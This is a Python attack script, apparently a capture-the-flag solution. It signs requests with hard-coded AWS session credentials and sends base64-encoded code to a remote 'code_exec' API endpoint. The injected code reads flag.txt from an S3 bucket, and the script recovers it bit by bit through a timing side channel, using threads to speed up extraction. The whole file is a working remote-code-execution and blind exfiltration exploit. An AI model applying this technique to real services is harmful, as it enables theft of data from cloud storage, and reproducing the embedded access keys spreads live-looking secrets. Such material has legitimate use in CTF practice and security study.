import requests
import json
import base64
import time
import threading
import queue
from aws_requests_auth.aws_auth import AWSRequestsAuth
import urllib3
urllib3.disable_warnings()

auth = AWSRequestsAuth(
    aws_access_key='ASIARYWSMSYIENSDUBKK', 
    aws_secret_access_key='23Fxo5y8Wrp9ls+NNPRc5XJt5Go2uEdI0OUgItO5', 
    aws_token='IQoJb3JpZ2luX2VjELr//////////wEaDGlsLWNlbnRyYWwtMSJHMEUCIDt9DXC8N6K6PDfzGGksybkuf600RZ3wFg6PkjAfYGd2AiEAhqLt5NPZVffyrB42pa/skJfbwoGk3Y1W+EJ3zvN/PKsqtQIIJhAAGgwxMjE3NzQwNTI4ODAiDCqaO9lwxG2KC+mRuSqSAs0YWyPzDDcZBzx9KQ5dFwX7Afgi3U6yQjev7Q/dxx6ITUOpSlNHD53TKUboxaaNjBMLxFdCB10yDBG8mUlYreETa8lzUWiALIGNKGw6wAYR8BZMBW7MlH/aBBx/YB5v+4Vb973P2pS4REXbF7Sb+SI4ri0nQtf2mf7frM6BysQdJ5o427513hvqQSjUsMQYxs6gPjrS1SkxgHOf3zLiQWpUPDjCfFP24+Wgt3iUQRMF3WtN2HtBO0cXjAkaNqCRcjBOZhF/mbZFyruCO4ZmysQJadIc3NrlE8oFzyLQsOLhnjZhngiSAfz9BdC2MaRHNp36WWQ8eZcmU7+/TmvPZ1rC/YQvmKXkGT+ktxHbLpF2qEEw8efM0wY6nQGSGx4kBcjgCaCaV4pUQ6k7A25YG28ozkplKrUR+ib49ukaB2vMHS0ZIy495FDt1wvD9Y7W/+0f+KQPDPvxLJ1AXN5OY4cpmeF6ug9fJdPmaTRZDfpe8l9H3oXuE9YBDq3SOEiOLm0Xqnnmmq8LJGeeQ8eNSAg5uVDaKWf7wH2+bB58XRg6B41WWOj8IqS9b7c/NIVaZ2d7W9jr031W', 
    aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com', 
    aws_region='us-east-1', 
    aws_service='execute-api'
)

URL = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"

def check_bit(pos, bit):
    code = f"""
import os, time, boto3
try:
    s3 = boto3.client('s3', region_name='us-east-1')
    resp = s3.get_object(Bucket='userd8a2f72fe43094e8', Key='flag.txt')
    val = resp['Body'].read().decode('utf-8')
except Exception as e:
    val = type(e).__name__

if len(val) > {pos} and (ord(val[{pos}]) & {bit}):
    time.sleep(2.0)
"""
    encoded_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    start = time.time()
    try:
        requests.post(URL, json={"code": encoded_code}, auth=auth, timeout=3)
    except:
        pass
    return (time.time() - start) > 1.5

def extract_pos(pos):
    char_code = 0
    for bit in [1, 2, 4, 8, 16, 32, 64]:
        if check_bit(pos, bit):
            char_code |= bit
    return chr(char_code) if char_code > 0 else ""

def thread_worker(pos, q):
    c = extract_pos(pos)
    q.put((pos, c))

def get_ex():
    print("Extracting flag.txt...", flush=True)
    length = 100
    res = [""] * length
    
    for chunk_start in range(0, length, 10):
        chunk_end = min(length, chunk_start + 10)
        threads = []
        queues = []
        for pos in range(chunk_start, chunk_end):
            q = queue.Queue()
            t = threading.Thread(target=thread_worker, args=(pos, q))
            t.start()
            threads.append(t)
            queues.append(q)
        for i, t in enumerate(threads):
            t.join()
            pos, c = queues[i].get()
            res[pos] = c
        curr = "".join(res[:chunk_end])
        print(f"Progress: {curr}", flush=True)
        if "}" in curr: 
            break
    return "".join(res)

if __name__ == '__main__':
    print("RESULT:", get_ex(), flush=True)
